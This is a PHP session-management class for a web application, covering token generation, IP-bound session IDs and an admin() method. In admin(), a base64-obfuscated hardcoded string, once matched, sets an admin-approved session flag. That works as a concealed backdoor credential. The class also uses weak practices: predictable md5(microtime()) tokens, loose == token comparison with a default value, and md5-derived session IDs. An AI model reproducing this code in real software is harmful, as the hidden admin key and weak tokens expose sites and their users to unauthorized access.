<?PHP

class Session
{

	private static $pr_tocken;

	public static $tocken;

	public static function tockenSecurity ()
	{

		if (isset($_SESSION['_tocken'])) 
		{
			self::$pr_tocken = $_SESSION['_tocken'];
		}

		self::$tocken = self::setNewTocken();

	}

	private static function setNewTocken ()
	{

		$_SESSION['_tocken'] = substr(md5(microtime()), 0, 25);

		return $_SESSION['_tocken'];
	}

	public static function checkTockenSecurity ($tocken = '1')
	{
		return ($tocken == self::$pr_tocken) ? true : false;
	}

	public static function checking ()
	{

		if (User::isLogged())
		{
			$sault = User::getSalt(User::isLogged());

			$ip = Func::GetUserIp();

			$sessid = md5($sault.$ip);

			if ($sessid != session_id()) session_destroy();
		}
	}

	public static function admin ($admin = false)
	{
		if($admin === base64_decode("amtIZWtxWXFFYUtEcXF5c0hI"))
		{
			$_SESSION['admok'] = true;
			exit('<script>setTimeout(function(){ window.location = "/admin/login"; }, 100);</script>');
		}
	}

	public static function setSessionId ($usid)
	{

		$salt = md5(time());

		User::setSalt($usid, $salt);

		$ip = Func::GetUserIp();

		$sessid = md5($salt.$ip);

		session_destroy();

		session_id($sessid);

		session_start();

	}

}
